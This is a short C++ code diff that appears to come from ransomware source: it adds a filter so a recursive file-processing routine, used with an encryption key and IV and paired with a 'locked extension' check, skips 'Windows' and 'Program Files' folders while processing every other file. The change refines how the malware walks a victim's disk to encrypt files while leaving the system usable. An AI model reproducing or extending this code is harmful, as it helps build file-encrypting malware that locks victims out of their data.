@@ -29,6 +29,20 @@ bool do_decrypt(const string& path)
 	return "." + find_extension(path) == LOCKED_EXTENSION;
 }
 
+bool is_valid_folder(const string& path)
+{
+	static std::unordered_set<string> unvalid_folder = {
+		"Windows", "Program Files"
+	};
+	for (auto folder : unvalid_folder)
+	{
+		if(path.find(folder) != string::npos)
+		{
+			return false;
+		}
+	}
+	return true;
+}
 void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key) {
 	string path;
 	directory_iterator end_itr;
@@ -37,7 +51,10 @@ void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key) {
 		path = itr->path().string();
 
 		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
-			iterate(path,process,iv,key);
+			if (is_valid_folder(path))
+			{
+				iterate(path, process, iv, key);
+			}
 		}
 		else {
 			process(path,iv,key);
